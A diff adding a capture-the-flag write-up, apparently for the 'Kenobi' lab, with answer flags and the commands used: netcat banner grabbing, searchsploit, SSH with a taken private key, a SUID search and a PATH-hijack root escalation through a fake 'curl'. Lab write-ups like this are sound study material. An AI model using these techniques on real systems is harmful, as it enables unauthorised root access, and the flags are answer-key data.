@@ -104,8 +104,90 @@ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.176.164
 
 ## 3. Task 3
 
-### 
+### Question 3.1
+**Question:** Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?
 
+**Answer:** `1.3.5`
+
+**How I found it:**
+```bash
+nc 10.48.176.164 21
+```
+
+**Screenshot:**  
+
+<img width="576" height="49" alt="image" src="https://github.com/user-attachments/assets/59d399a1-b505-40df-a531-46afacd3123e" />
+
+### Question 3.2
+**Question:** How many exploits are there for the ProFTPd running?
+
+**Answer:** `4`
+
+**How I found it:**
+```bash
+searchsploit proftpd 1.3.5
+```
+
+**Screenshot:**  
+
+<img width="1247" height="185" alt="image" src="https://github.com/user-attachments/assets/eae359c6-e6c7-48e9-b69f-a863d314c9a3" />
+
+### Question 3.3
+**Question:** What is Kenobi's user flag (/home/kenobi/user.txt)?
+
+**Answer:** `d0b0f3f53b6caa532a83915e19224899`
+
+**How I found it:**
+```bash
+sudo ssh -i id_rsa kenobi@10.48.176.164
+cat user.txt
+```
 ---
 
 ## 4. Task 4
+
+### Question 4.1
+**Question:** To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null
+              What file looks particularly out of the ordinary?
+
+**Answer:** `/usr/bin/menu`
+
+**How I found it:**
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+**Screenshot:**  
+
+<img width="511" height="548" alt="image" src="https://github.com/user-attachments/assets/bd7dd7c2-4aa4-46b2-b3d6-0d61d416ca9b" />
+
+### Question 4.2
+**Question:** Run the binary, how many options appear?
+
+**Answer:** `3`
+
+**How I found it:**
+```bash
+menu
+```
+
+**Screenshot:**  
+
+<img width="338" height="115" alt="image" src="https://github.com/user-attachments/assets/6c6dca35-ab87-4b86-8a33-01f9c109cb59" />
+
+### Question 4.3
+**Question:** What is the root flag (/root/root.txt)?
+
+**Answer:** `177b3cd8562289f37382721c28381f02`
+
+**How I found it:**
+```bash
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+```
+
+**Screenshot:**  
+
+<img width="1066" height="309" alt="image" src="https://github.com/user-attachments/assets/9e3edc19-51b5-42b0-bcb8-351c1935e575" />
